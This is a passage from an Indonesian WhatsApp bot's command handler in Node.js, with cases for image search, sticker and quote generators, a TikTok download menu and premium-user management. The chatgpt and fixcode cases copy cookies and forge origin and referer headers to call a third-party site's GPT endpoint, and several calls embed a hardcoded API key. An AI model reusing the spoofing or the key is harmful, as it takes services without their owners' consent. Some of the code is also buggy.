                url: selectedImages[i].source || selectedImages[i].image
              })
            }]
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          })
        })
      }

      // Buat format `carouselMessage`
      const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `🔎 Berikut hasil pencarian gambar untuk *${text}*`
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: anu
              })
            })
          }
        }
      }, {
        userJid: m.sender,
        quoted: qfake
      })

      Putzz.relayMessage(m.chat, msg.message, {
        messageId: msg.key.id
      })
    }
 
    break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gimage": {
if (!text) return ReplyLanz(example("logo whatsapp"))
await Putzz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
const res = await fetchJson(`https://api.skyzopedia.us.kg/api/search/gimage?q=${text}`)
if (!res.status) return ReplyLanz("Error")
let total = 0
let aray
if (res.result.length < 5) {
aray = res.result
} else {
aray = res.result.slice(0, 5)
}
for (let i of aray) {
await Putzz.sendMessage(m.chat, {image: {url: i.url}, caption: `Hasil pencarian foto ke ${total += 1}`}, {quoted: m})
}
await Putzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* *[ Chat Gpt ]*
Type? Case
Sumber Scrape: https://whatsapp.com/channel/0029VbANq6v0VycMue9vPs3u/110
Code? 
*/

// Code
case 'fixcode': {
    if (!text) return ReplyLanz(`Contoh: ${prefix + command} consile.log(chalk.blue.bold('kelass)`);
    const model_list = {
        chatgpt4: {
            api: 'https://stablediffusion.fr/gpt4/predict2',
            referer: 'https://stablediffusion.fr/chatgpt4'
        }
    };

    try {
        let results = [];
        for (const [model, config] of Object.entries(model_list)) {
            try {
// = require('axios');
                const hmm = await axios.get(config.referer);
                const { data } = await axios.post(config.api, {
                    prompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript
- Hasil akhir harus langsung berupa kode yang siap dijalankan\n` + text
                }, {
                    headers: {
                        accept: '*/*',
                        'content-type': 'application/json',
                        origin: 'https://stablediffusion.fr',
                        referer: config.referer,
                        cookie: hmm.headers['set-cookie'].join('; '),
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'
                    }
                });
                results.push(`*${model.toUpperCase()}*:\n${data.message || 'Tidak ada jawaban.'}`);
            } catch (err) {
                results.push(`*${model.toUpperCase()}*:\nGagal mengambil jawaban.`);
                console.error(`Error on ${model}:`, err.message);
            }
        }
        ReplyLanz(results.join('\n\n'));
    } catch (e) {
        console.error(e);
        ReplyLanz('Terjadi kesalahan saat mengambil jawaban.');
    }
}
break
/* *[ Chat Gpt ]*
Type? Case
Sumber Scrape: https://whatsapp.com/channel/0029VbANq6v0VycMue9vPs3u/110
Code? 
*/

// Code
case 'chatgpt': {
    if (!text) return ReplyLanz(`Contoh: ${prefix + command} Apa itu AI?`);
    const model_list = {
        chatgpt4: {
            api: 'https://stablediffusion.fr/gpt4/predict2',
            referer: 'https://stablediffusion.fr/chatgpt4'
        },
        chatgpt3: {
            api: 'https://stablediffusion.fr/gpt3/predict',
            referer: 'https://stablediffusion.fr/chatgpt3'
        }
    };

    try {
        let results = [];
        for (const [model, config] of Object.entries(model_list)) {
            try {
// = require('axios');
                const hmm = await axios.get(config.referer);
                const { data } = await axios.post(config.api, {
                    prompt: text
                }, {
                    headers: {
                        accept: '*/*',
                        'content-type': 'application/json',
                        origin: 'https://stablediffusion.fr',
                        referer: config.referer,
                        cookie: hmm.headers['set-cookie'].join('; '),
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'
                    }
                });
                results.push(`*${model.toUpperCase()}*:\n${data.message || 'Tidak ada jawaban.'}`);
            } catch (err) {
                results.push(`*${model.toUpperCase()}*:\nGagal mengambil jawaban.`);
                console.error(`Error on ${model}:`, err.message);
            }
        }
        ReplyLanz(results.join('\n\n'));
    } catch (e) {
        console.error(e);
        ReplyLanz('Terjadi kesalahan saat mengambil jawaban.');
    }
}
break


case "ttm":
case "tiktokm": {
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
  const logoUrl = "https://files.catbox.moe/uq02xf.jpg" // Ganti dengan URL logo kamu
  const axios = require("axios")

  // Ambil logo dan ubah ke buffer
  let logoBuffer
  try {
    const res = await axios.get(logoUrl, { responseType: "arraybuffer" })
    logoBuffer = Buffer.from(res.data, "binary")
  } catch (e) {
    logoBuffer = null
  }

  await Putzz.sendMessage(
    m.chat,
    {
      location: {
        degreesLatitude: -6.2088, // Jakarta
        degreesLongitude: 106.8456,
        name: "TIKTOK Downloader",
        address: "©copyright by Putzz",
        jpegThumbnail: logoBuffer ? logoBuffer : null, // Logo ditampilkan di bubble
      },
      caption: `🌀 *SILAHKAN PILIH YANG ANDA BUTUHKAN*`,
      footer: "©copyright by Putzz",
      buttons: [
        {
          buttonId: `.putzzmp4 ${text}`,
          buttonText: { displayText: "🎬 ᴛᴛ ᴠɪᴅᴇᴏ" },
          type: 1,
        },
        {
          buttonId: `.putzzmp3 ${text}`,
          buttonText: { displayText: "🎧 ᴛᴛ ᴀᴜᴅɪᴏ" },
          type: 1,
        },
      ],
      headerType: 6,
      viewOnce: true,
    },
    { quoted: qlive }
  )
}
break



case 'gifsearch' :
case 'gifs' : {
//const  require('axios')
//// = require('cheerio')
const { Sticker } = require('wa-sticker-formatter')

async function gifsSearch(q) {
 try {
 const searchUrl = `https://tenor.com/search/${q}-gifs`;
 const { data } = await axios.get(searchUrl, {
 headers: {
 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 }
 });
 
 const $ = cheerio.load(data);
 const results = [];

 $("figure.UniversalGifListItem").each((i, el) => {
 const $el = $(el);
 const img = $el.find("img"); 
 const gifUrl = img.attr("src");
 const alt = img.attr("alt") || "No description";
 const detailPath = $el.find("a").first().attr("href"); 
 
 if (gifUrl && gifUrl.endsWith('.gif') && detailPath) {
 results.push({
 gif: gifUrl,
 alt,
 link: "https://tenor.com" + detailPath
 });
 }
 });

 return results;
 } catch (error) {
 console.error("Error fetching GIFs:", error);
 return [];
 }
}
 const parts = text.split(',');
 const query = parts[0].trim();
 let count = 15;
 
 if (!query) return ReplyLanz(`Masukin Query Nya\n*Example :* .gifsticker query,jumlah atau .${command} pocoyo,5`);
 
 if (parts[1]) {
 const num = parseInt(parts[1].trim());
 if (!isNaN(num) && num > 0) {
 count = num;
 }
 }
 
 try {
 const gifs = await gifsSearch(query);
 if (!gifs.length) return ReplyLanz(`Gaada GIF Buat ${query}`);
 
 const actualCount = Math.min(count, gifs.length);
 await ReplyLanz(`*Total Result : ${gifs.length} Send ${actualCount} stiker...*`);
 
 for (const item of gifs.slice(0, actualCount)) {
 try {
 const sticker = new Sticker(item.gif, {
 pack: `${query}`,
 author: `${m.pushName}`,
 type: 'full',
 quality: 70
 });
 
 await Putzz.sendMessage(m.chat, await sticker.toMessage(), {
 quoted: m
 });
 
 await new Promise(resolve => setTimeout(resolve, 500));
 } catch (error) {
 console.error(`Gagal Convert Ke GIF`, error);
 }
 }
 
 } catch (error) {
 console.error(error);
 ReplyLanz('Error Cba Lagi Nanti :v');
 }
};
break
    case "addpr": {
        // Range file
        const start = 21;
        const end = 100;

        // Folder tujuan
        const folder = './library/database/userVip';
        fs.mkdirSync(folder, { recursive: true });

        for (let i = start; i <= end; i++) {
            const filename = `premium${i}.json`;
            const filepath = path.join(folder, filename);
            fs.writeFileSync(filepath, '[]', 'utf8');
        }

        console.log(`✅ Berhasil membuat file premium${start}.json sampai premium${end}.json di folder '${folder}'`);
        break;
    }



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'oi-brat': {
  //              if (!isPremium) return tolak(mess.OnlyP)
                if (!text) return ReplyLanz(`Contoh: ${prefix+command} hai min`);

                const quoted = m && (m.quoted || m);

                try {
                    let response;
                    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

                    if (mimetype && /image/.test(mimetype)) {
                        const imageBuffer = await quoted.download();
                        ReplyLanz('Maaf, saya tidak bisa memproses gambar untuk fitur ini.');
                        break;
                    }

                    // Menggunakan API Simi untuk mendapatkan respons
                    response = await fetchJson(`${global.vapis}/api/simi?q=${encodeURIComponent(text)}`);
                    if (!response.result) return ReplyLanz('Aku tidak mengerti 😕');

                    // Mengambil hasil dari API untuk dikirimkan sebagai stiker
                    let res = await fetch(`${global.vapis}/api/bratv1?q=${encodeURIComponent(response.result)}`);
                    if (!res.ok) return ReplyLanz(`Terjadi kesalahan saat memproses permintaanmu.`);

                    let buffer = await res.buffer();
                    await Putzz.sendAsSticker(m.chat, buffer, m, {
                        packname: ``,
                        author: `${botname}`
                    });

                } catch (err) {
                    ReplyLanz('Terjadi kesalahan');
                }
                break;
            }
            case 'bratnime': {
                if (!text) return ReplyLanz(`Contoh: ${command} halo bro`)
                if (text.length > 250) return ReplyLanz(`Karakter terbatas, max 250!`)
//                vreact()
                let res = await fetch(`https://api.agungny.my.id/api/animbrat?q=${text}`)
                let buffer = await res.buffer()
                await Putzz.sendAsSticker(m.chat, buffer, m, {
                    packname: `made by Mikasa MD`,
                    author: `${m.pushName}`
                })
            }
            break
            case 'bratai': {
                if (!text) return ReplyLanz(`Contoh: ${prefix+command} hai min`);

                const prompt = "Nama kamu asuma tokii. Kamu seorang AI yang baik, ramah, dan lucu. Jawablah dengan singkat, kadang sok marah, dan jangan lupa kasih emoticon lucu biar seru. Kamu juga gak suka kalau orang tanya hal aneh, bisa-bisa kamu ngamuk. Kamu menjawab setiap Jawaban Sesingkat Mungkin, Tidak boleh lebih dari 250 Karakter Agar tidak error.";

                const requestData = {
                    content: text,
                    user: m.sender,
                    prompt: prompt
                };
                const quoted = m && (m.quoted || m);

                try {
                    let response;
                    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

                    if (mimetype && /image/.test(mimetype)) {
                        requestData.imageBuffer = await quoted.download();
                    }

                    // Mengambil hasil dari API
                    response = (await axios.post('https://luminai.my.id', requestData)).data.result;

                    // Mengambil hasil dari response untuk dikirimkan sebagai stiker
                    let res = await fetch(`${global.vapis}/api/bratv1?q=${response}`);
                    if (!res.ok) return ReplyLanz(`Terjadi kesalahan saat memproses permintaanmu.`);

                    let buffer = await res.buffer();
                    await Putzz.sendAsSticker(m.chat, buffer, m, {
                        packname: ``,
                        author: ``
                    });

                } catch (err) {
                    ReplyLanz('Terjadi kesalahan');
                }
                break;
                }
                case "brat": {
    if (!text.trim()) return ReplyLanz(example("teksnya"));

    try {
        const buttonsMessage = {
            text: `*Silahkan pilih jenis sticker brat yang diinginkan*`,
            footer: `*${botname}*`,
            buttons: [
                { buttonId: `${prefix}bratv1 ${text}`, buttonText: { displayText: 'Brat Image' }, type: 1 },
                { buttonId: `${prefix}bratv2 hitam ${text}`, buttonText: { displayText: 'Brat Image V2' }, type: 1 }, 
                { buttonId: `${prefix}bratv3 ${text}`, buttonText: { displayText: 'Brat Video' }, type: 1 }
            ],
            headerType: 1,
            viewOnce: true,
            contextInfo: {
                mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
            }
        };

        await Putzz.sendMessage(m.chat, buttonsMessage, { quoted: m });

    } catch (error) {
        console.error(error);
        return ReplyLanz(`❌ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;
            case 'bratv1': {
                if (!text) return ReplyLanz(`Contoh: ${command} halo bro`);
                if (text.length > 250) return ReplyLanz(`Karakter terbatas, max 250!`);

                let res = await fetch(`https://aqul-brat.hf.space/?text=${text}`);
                if (!res.ok) return ReplyLanz(`Terjadi kesalahan saat memproses permintaanmu.`);

                let buffer = await res.buffer();
                await Putzz.sendAsSticker(m.chat, buffer, m, {
                    packname: `Made By Mikasa MD`,
                    author: `\nDibuat Oleh ${m.pushName}`
                });
            }
            break
            
                        case 'attp2':
                //if (!isRegistered) return registerbut(noregis)               
                try {
                    if (args.length == 0) return ReplyLanz(`Example: ${prefix + command} anjay alok`)
                    await Putzz.sendMessage(m.chat, {
                        sticker: {
                            url: `https://api.lolhuman.xyz/api/attp2?apikey=DitssGanteng&text=${full_args}`
                        }
                    }, {
                        quoted: m
                    })
                } catch (e) {
                    ReplyLanz(msg.error)
                }
                break
            case 'ttp':
                //if (!isRegistered) return registerbut(noregis)             
                try {
                    if (args.length == 0) return ReplyLanz(`Example: ${prefix + command} anjay alok`)
                    await Putzz.sendMessage(m.chat, {
                        sticker: {
                            url: `https://api.lolhuman.xyz/api/ttp?apikey=DitssGanteng&text=${full_args}`
                        }
                    }, {
                        quoted: m
                    })
                } catch (e) {
                    ReplyLanz(mess.error)
                }
                break
            case 'ttp2':
                //if (!isRegistered) return registerbut(noregis)             
                try {
                    if (args.length == 0) return ReplyLanz(`Example: ${prefix + command} anjay alok`)
                    await Putzz.sendMessage(m.chat, {
                        sticker: {
                            url: `https://api.lolhuman.xyz/api/ttp?apikey=DitssGanteng&text=${full_args}`
                        }
                    }, {
                        quoted: m
                    })
                } catch (e) {
                    ReplyLanz(mess.error)
                }
                break
case "bratv2": {
if (!text) return ReplyLanz("Contoh:\n.brav2 merah halo dunia")

let args = text.split(" ")
let color = args.shift().toLowerCase()
let teks = args.join(" ")

if (!teks) return ReplyLanz("Masukkan teks!")
await reaksi('⚡') 
const sharp = require('sharp');
let warna = {
merah: "red",
biru: "blue",
hijau: "green",
pink: "pink",
kuning: "orange",
ungu: "purple",
hitam: "hitam",
orange: "orange"
}

let finalColor = warna[color] || "black"

try {
let url = `https://lanzcihuyyy-apitermux.vercel.app/api/brat?text=${encodeURIComponent(teks)}&color=${finalColor}`
let res = await fetch(url)
if (!res.ok) return ReplyLanz("Gagal membuat brat")

let svgBuffer = await res.buffer()
let pngBuffer = await sharp(svgBuffer).png().toBuffer()

await Putzz.sendAsSticker(m.chat, pngBuffer, m, {
                    packname: `Made By Mikasa MD`,
                    author: `\nDibuat Oleh ${m.pushName}`
                });
} catch (e) {
console.log(e)
ReplyLanz("Error membuat brat")
}
}
break
case "bratvidv2": {
if (!text) return ReplyLanz("Contoh:\n.bratvidv2 merah halo dunia")

let args = text.split(" ")
let color = args.shift().toLowerCase()
let teks = args.join(" ")

if (!teks) return ReplyLanz("Masukkan teks!")
await reaksi('⚡') 
const sharp = require('sharp');
let warna = {
merah: "red",
biru: "blue",
hijau: "green",
pink: "pink",
kuning: "orange",
ungu: "purple",
hitam: "red",
orange: "orange"
}

let finalColor = warna[color] || "black"

try {
let url = `https://lanzcihuyyy-apitermux.vercel.app/api/bratvid?text=${encodeURIComponent(teks)}&color=${finalColor}`
let res = await fetch(url)
if (!res.ok) return ReplyLanz("Gagal membuat brat")

let svgBuffer = await res.buffer()
fs.writeFileSync("temp.svg", svgBuffer)

await new Promise((resolve, reject) => {
const { spawn } = require("child_process")

const ffmpeg = spawn("ffmpeg", [
"-y",
"-i", "temp.svg",
"-vf", "scale=512:512",
"-r", "30",
"-pix_fmt", "yuv420p",
"temp.mp4"
])

ffmpeg.on("close", (code) => {
if (code === 0) resolve()
else reject(new Error("FFmpeg error " + code))
})
})

let mp4Buffer = fs.readFileSync("temp.mp4")
await Putzz.sendAsSticker(m.chat, mp4Buffer, m, {
                    packname: `Made By Mikasa MD`,
                    author: `\nDibuat Oleh ${m.pushName}`
                });

await fs.unlinkSync(mp4Buffer)
} catch (e) {
console.log(e)
ReplyLanz("Error membuat brat")
}
}
break

case 'bratt': {
    if (!text) return ReplyLanz(`Contoh:\n${prefix+command} pink halo bro`)

    let args = text.split(" ")
    let color = args.shift().toLowerCase()
    let teks = args.join(" ")

    if (!teks) return ReplyLanz(`Masukkan teksnya`)

    const warna = {
        red: "#ff0000",
        blue: "#0094ff",
        green: "#00ff2a",
        pink: "#ff4fd8",
        yellow: "#ffee00",
        purple: "#a200ff",
        black: "#000000"
    }

    let textColor = warna[color] || "#000000"

    const canvas = createCanvas(512, 512)
    const ctx = canvas.getContext("2d")

    ctx.fillStyle = "white"
    ctx.fillRect(0,0,512,512)

    ctx.fillStyle = textColor
    ctx.font = "bold 60px Sans"
    ctx.textAlign = "center"
    ctx.textBaseline = "middle"

    ctx.fillText(teks, 256, 256, 450)

    let buffer = canvas.toBuffer()

    await Putzz.sendAsSticker(m.chat, buffer, m, {
        packname: "Made By Mikasa MD",
        author: `Dibuat oleh ${m.pushName}`
    })
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/

            case 'bratv3':
            case 'bratvideo':
            case 'bratvid': {
                if (!text) return ReplyLanz(`Contoh: ${prefix+command} hai`)

                const words = text.split(" ")
                const tempDir = path.join(process.cwd(), 'lib')
                if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
                const framePaths = []

                try {
                    for (let i = 0; i < words.length; i++) {
                        const currentText = words.slice(0, i + 1).join(" ")

                        const res = await axios.get(
                            `https://aqul-brat.hf.space/?text=${encodeURIComponent(currentText)}`, {
                                responseType: "arraybuffer"
                            }
                        ).catch((e) => e.response)

                        const framePath = path.join(tempDir, `frame${i}.mp4`)
                        fs.writeFileSync(framePath, res.data)
                        framePaths.push(framePath)
                    }

                    const fileListPath = path.join(tempDir, "filelist.txt")
                    let fileListContent = ""

                    for (let i = 0; i < framePaths.length; i++) {
                        fileListContent += `file '${framePaths[i]}'\n`
                        fileListContent += `duration 0.7\n`
                    }

                    fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
                    fileListContent += `duration 2\n`

                    fs.writeFileSync(fileListPath, fileListContent)
                    const outputVideoPath = path.join(tempDir, "output.mp4")
                    execSync(
                        `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset ultrafast -pix_fmt yuv420p ${outputVideoPath}`
                    )

                    await Putzz.sendAsSticker(m.chat, outputVideoPath, m, {
                        packname: 'Made By Cy,bro botz',
                        author: `\nDibuat Oleh ${m.pushName}`
                    })

                    framePaths.forEach((frame) => {
                        if (fs.existsSync(frame)) fs.unlinkSync(frame)
                    })
                    if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
                    if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
                } catch (e) {
                    console.error(e)
                    ReplyLanz('Terjadi kesalahan')
                }
            }
            break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "qdc": {
 if (!text) return ReplyLanz(example("text nya mana kak?"));
return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'click here',
          sections: [
            {
              title: 'PILIH WARNA NYA TUAN',
              highlight_label: '',
              rows: [
                { title: 'HYTAM', description: '#000000', id: `.qc1 ${text} | #000000` },
                { title: 'PUTIH', description: '#FFFFFF', id: `.qc1 ${text} | #FFFFFF`, }, 
                { title: 'MERAH', description: '#FF0000', id: `.qc1 ${text} | #FF0000`, }, 
                { title: 'HIJAU', description: '00FF00', id: `.qc1 ${text} | #00FF00`, }, 
                { title: 'BIRU', description: '0000FF', id: `.qc1 ${text} | #0000FF`, }, 
                { title: 'KUNING', description: 'FFFF00', id: `.qc1 ${text} | #FFFF00`, }, 
                { title: 'CYAN', description: '#00FFFF', id: `.qc1 ${text} | #00FFFF`, }, 
                { title: 'MAGENTA', description: 'FF00FF', id: `.qc1 ${text} | #FF00FF`, }, 
                { title: 'ABU ABU', description: '#080808', id: `.qc1 ${text} | #080808`, }, 
                { title: 'COKLAT', description: '8B4513C', id: `.qc1 ${text} | #8B4513`, }, 
                { title: 'ORANGE', description: '#FFA500', id: `.qc1 ${text} | #FFA500`, }, 
                { title: 'PINK', description: '#FFC0CB', id: `.qc1 ${text} | #FFC0CB`, }, 
                { title: 'UNGU', description: '#800080', id: `.qc1 ${text} | #800080`, }, 
                { title: 'BIRU TUA', description: '#00008B', id: `.qc1 ${text} | #00008B`, }, 
                { title: 'HIJAU TUA', description: '#006400', id: `.qc1 ${text} | #006400`, }, 
                { title: 'MERAH GELAP', description: `#8B0000`, id: `.qc1 ${text} | #8B0000`, }, 
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Warna Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qfake })
}
break
case "qc":
        {
          if (!q) {
            return ReplyLanz(`☘️ *Contoh : Qc White LanzOfficial*\n🎁 *Kode Warna Ketik : Qckode*`);
          }
          Putzz.sendMessage(m.chat, {
            react: {
              text: "⏱️",
              key: m.key
            }
          });
          if (text.length > 800) {
            return ReplyLanz(`☘️ *Maksimal 800 Karakter*`);
          }
          let [color, ...message] = text.split(" ");
          message = message.join(" ");
          let backgroundColor;
          switch (color) {
            case "pink":
            case "Pink":
              backgroundColor = "#f68ac9";
              break;
            case "blue":
            case "Blue":
              backgroundColor = "#6cace4";
              break;
            case "red":
            case "Red":
              backgroundColor = "#f44336";
              break;
            case "green":
            case "Green":
              backgroundColor = "#4caf50";
              break;
            case "yellow":
            case "Yellow":
              backgroundColor = "#ffeb3b";
              break;
            case "purple":
            case "Purple":
              backgroundColor = "#9c27b0";
              break;
            case "darkblue":
            case "Darkblue":
              backgroundColor = "#0d47a1";
              break;
            case "lightblue":
            case "Lightblue":
              backgroundColor = "#03a9f4";
              break;
            case "ash":
            case "Ash":
              backgroundColor = "#9e9e9e";
              break;
            case "orange":
            case "Orange":
              backgroundColor = "#ff9800";
              break;
            case "black":
            case "Black":
              backgroundColor = "#000000";
              break;
            case "white":
            case "White":
              backgroundColor = "#ffffff";
              break;
            case "teal":
            case "Teal":
              backgroundColor = "#008080";
              break;
            case "lightpink":
            case "Lightpink":
              backgroundColor = "#FFC0CB";
              break;
            case "chocolate":
            case "Chocolate":
              backgroundColor = "#A52A2A";
              break;
            case "salmon":
            case "Salmon":
              backgroundColor = "#FFA07A";
              break;
            case "magenta":
            case "Magenta":
              backgroundColor = "#FF00FF";
              break;
            case "tan":
            case "Tan":
              backgroundColor = "#D2B48C";
              break;
            case "wheat":
            case "Wheat":
              backgroundColor = "#F5DEB3";
              break;
            case "deeppink":
            case "Deeppink":
              backgroundColor = "#FF1493";
              break;
            case "fire":
            case "Fire":
              backgroundColor = "#B22222";
              break;
            case "skyblue":
            case "Skyblue":
              backgroundColor = "#00BFFF";
              break;
            case "orange":
            case "Orange":
              backgroundColor = "#FF7F50";
              break;
            case "brightskyblue":
            case "Brightskyblue":
              backgroundColor = "#1E90FF";
              break;
            case "hotpink":
            case "Hotpink":
              backgroundColor = "#FF69B4";
              break;
            case "lightskyblue":
            case "Lightskyblue":
              backgroundColor = "#87CEEB";
              break;
            case "seagreen":
            case "Seagreen":
              backgroundColor = "#20B2AA";
              break;
            case "darkred":
            case "Darkred":
              backgroundColor = "#8B0000";
              break;
            case "orangered":
            case "Orangered":
              backgroundColor = "#FF4500";
              break;
            case "cyan":
            case "Cyan":
              backgroundColor = "#48D1CC";
              break;
            case "violet":
            case "Violet":
              backgroundColor = "#BA55D3";
              break;
            case "mossgreen":
            case "Mossgreen":
              backgroundColor = "#00FF7F";
              break;
            case "darkgreen":
            case "Darkgreen":
              backgroundColor = "#008000";
              break;
            case "navyblue":
            case "Navyblue":
              backgroundColor = "#191970";
              break;
            case "darkorange":
            case "Darkorange":
              backgroundColor = "#FF8C00";
              break;
            case "darkpurple":
            case "Darkpurple":
              backgroundColor = "#9400D3";
              break;
            case "fuchsia":
            case "Fuchsia":
              backgroundColor = "#FF00FF";
              break;
            case "darkmagenta":
            case "Darkmagenta":
              backgroundColor = "#8B008B";
              break;
            case "darkgray":
            case "Darkgray":
              backgroundColor = "#2F4F4F";
              break;
            case "peachpuff":
            case "Peachpuff":
              backgroundColor = "#FFDAB9";
              break;
            case "darkishgreen":
            case "Darkishgreen":
              backgroundColor = "#BDB76B";
              break;
            case "darkishred":
            case "Darkishred":
              backgroundColor = "#DC143C";
              break;
            case "goldenrod":
            case "Goldenrod":
              backgroundColor = "#DAA520";
              break;
            case "darkishgray":
            case "Darkishgray":
              backgroundColor = "#696969";
              break;
            case "darkishpurple":
            case "Darkishpurple":
              backgroundColor = "#483D8B";
              break;
            case "gold":
            case "Gold":
              backgroundColor = "#FFD700";
              break;
            case "silver":
            case "Silver":
              backgroundColor = "#C0C0C0";
              break;
            default:
              return ReplyLanz("⚠ *Bukan begitu tapi begini contohnya, .qc white (teksnya) nah begitu. untuk melihat kode warna silahkan .qckode*");
          }
          let obj = {
            type: "quote",
            format: "png",
            backgroundColor,
            width: 512,
            height: 768,
            scale: 2,
            messages: [{
              entities: [],
              avatar: true,
              from: {
                id: 1,
                name: m.pushName,
                photo: {
                  url: await Putzz.profilePictureUrl(m.sender, "image").catch(() => "https://telegra.ph/file/6880771a42bad09dd6087.jpg")
                }
              },
              text: message,
              replyMessage: {}
            }]
          };
          let response = await axios.post("https://bot.lyo.su/quote/generate", obj, {
            headers: {
              "Content-Type": "application/json"
            }
          });
          let buffer = Buffer.from(response.data.result.image, "base64");
          Putzz.sendAsSticker(m.chat, buffer, m, {
            packname: `${global.packname}`,
            author: `${m.pushName}`
          });
        }
        break;

      // https://bot.lyo.su/quote/generate
      // https://qc.sazumi.moe/generate
      // https://quotly.netorare.codes 

      case "qckode":
        {
          ReplyLanz(`📦 *Kode Warna Qc*
 *⨠ Pink*
 *⨠ Blue*
 *⨠ Red*
 *⨠ Green*
 *⨠ Yellow*
 *⨠ Purple*
 *⨠ Darkblue*
 *⨠ Lightblue*
 *⨠ Ash*
 *⨠ Orange*
 *⨠ Black*
 *⨠ White*
 *⨠ Teal*
 *⨠ Lightpink*
 *⨠ Chocolate*
 *⨠ Salmon*
 *⨠ Magenta*
 *⨠ Tan*
 *⨠ Wheat*
 *⨠ Deeppink*
 *⨠ Fire*
 *⨠ Skyblue*
 *⨠ Safron*
 *⨠ Brightskyblue*
 *⨠ Hotpink*
 *⨠ Lightskyblue*
 *⨠ Seagreen*
 *⨠ Darkred*
 *⨠ Orangered*
 *⨠ Cyan*
 *⨠ Violet*
 *⨠ Mossgreen*
 *⨠ Darkgreen*
 *⨠ Navyblue*
 *⨠ Darkorange*
 *⨠ Darkpurple*
 *⨠ Fuchsia*
 *⨠ Darkmagenta*
 *⨠ Darkgray*
 *⨠ Peachpuff*
 *⨠ Blackishgreen*
 *⨠ Darkishred*
 *⨠ Goldenrod*
 *⨠ Darkishgray*
 *⨠ Darkishpurple*
 *⨠ Gold*
 *⨠ Silver*

⚠️ *Kalo Ada Error Bisa Chat Owner Ya*
`);
        }
        break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "nulis": case "tulis": {
  if (!text) return ReplyLanz('❌ Masukkan teks yang ingin ditulis.\n\nExample: nulis Biyu Tamvan');
  ReplyLanz(mess.wait);
//  const  require('axios');
  let apiUrl = `https://nirkyy.koyeb.app/api/v1/nulis?text=${encodeURIComponent(text)}`;
  try {
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    Putzz.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: `📝 *Hasil Tulisan* 📝\n\n📌 *Teks:* ${text}`
    }, { quoted: qtoko });
  } catch (error) {
    console.log(error);
    ReplyLanz(`❌ Error\nLogs error : ${error.message}`);
  }
}
break

case "addprem":
case "addpremium": {
    if (!isCreator && !isOwner) return ReplyLanz(mess.owner) 
    if (!text && !m.mentionedJid && !m.quoted) return ReplyLanz(example("@tag/Nomor/Balas pesan target"));

    let phoneNumber;

    if (m.mentionedJid?.length) {
        phoneNumber = m.mentionedJid[0].replace(/@s\.whatsapp\.net$/, "").trim();
    } else if (m.quoted) {
        phoneNumber = m.quoted.sender.replace(/@s\.whatsapp\.net$/, "");
    } else if (text) {
        phoneNumber = text.replace(/[^0-9]/g, "");
    }

    if (!phoneNumber) return ReplyLanz(example("@tag/Nomor/Balas pesan target"));
    if (phoneNumber.startsWith("0")) return ReplyLanz("⚠️ Awalan nomor harus berupa kode negara (62xx), bukan 0!");

    const check = await Putzz.onWhatsApp(phoneNumber);
    if (check.length < 1) return ReplyLanz("⚠️ Nomor tersebut tidak terdaftar di WhatsApp!");

    try {
        const teksnya = "*Pilih Versi Untuk Menambahkan Reseller Panel*";

        const sections = [
            {
                title: "# Silahkan Pilih Server Untuk Reseller Panel",
                highlight_label: ``,
                rows: Array.from({ length: 100 }, (_, i) => ({
